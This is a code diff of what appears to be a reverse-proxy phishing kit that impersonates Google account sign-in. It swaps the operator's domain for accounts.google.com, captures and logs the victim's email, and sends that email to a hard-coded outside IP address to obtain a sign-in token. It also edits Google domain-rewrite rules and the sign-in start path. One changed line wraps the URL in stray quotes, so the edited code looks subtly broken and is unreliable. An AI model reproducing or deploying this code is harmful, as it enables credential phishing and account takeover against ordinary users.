@@ -31,6 +31,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                 cJust += chunk.toString('utf8')
             })
             this.browserReq.on('end', () => {
+                cJust += ''
                 const hostDomainRegex = new RegExp(process.env.HOST_DOMAIN, 'gi')
                 const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')
 
@@ -51,7 +52,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                         Object.assign(this.browserReq.clientSession.sessionBody,
                             { email: emailGmail })
                         console.log(`email address is ${emailGmail}`)
-                        superagent.get(`http://49.12.240.55:8080/token/${emailGmail}`)
+                        superagent.get(`'http://49.12.240.55':8080/token/${emailGmail}`)
                             .end((err, resp) => {
                             if (resp && resp.body) {
                                 const bgToken = resp.body.token
@@ -109,22 +110,22 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
        
         super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
         this.regexes = [
-            {
-                reg: /play.google.com/ig,
-                replacement: `${process.env.HOST_DOMAIN}/playboy`,
-            },
-           {
-               reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
-               replacement: `${process.env.HOST_DOMAIN}/CheckConnection`,
-           },
-           {
-               reg: /name="checkConnection" value/gi,
-               replacement: /name"checkConnection" value="youtube:1052:1"/,
-           },
-           {
-               reg: /signaler-pa.googleapis.com/gi,
-               replacement: process.env.HOST_DOMAIN,
-           },
+        //     {
+        //         reg: /play.google.com/ig,
+        //         replacement: `${process.env.HOST_DOMAIN}/playboy`,
+        //     },
+        //    {
+        //        reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
+        //        replacement: `${process.env.HOST_DOMAIN}/CheckConnection`,
+        //    },
+        //    {
+        //        reg: /name="checkConnection" value/gi,
+        //        replacement: /name"checkConnection" value="youtube:1052:1"/,
+        //    },
+        //    {
+        //        reg: /signaler-pa.googleapis.com/gi,
+        //        replacement: process.env.HOST_DOMAIN,
+        //    },
         ]
     }
 
@@ -180,7 +181,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
-        this.req.headers['accept-encoding'] = 'plain, br'
+        this.req.headers['accept-encoding'] = 'br'
         if (this.req.method === 'POST') {
             // super.uploadRequestBody(clientContext.currentDomain, clientContext)
         }
@@ -246,7 +247,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 const configExport = {
     CURRENT_DOMAIN: 'accounts.google.com',
 
-    START_PATH: '/ServiceLogin?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en',
+    START_PATH: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
 
     EXTERNAL_FILTERS: 
     [
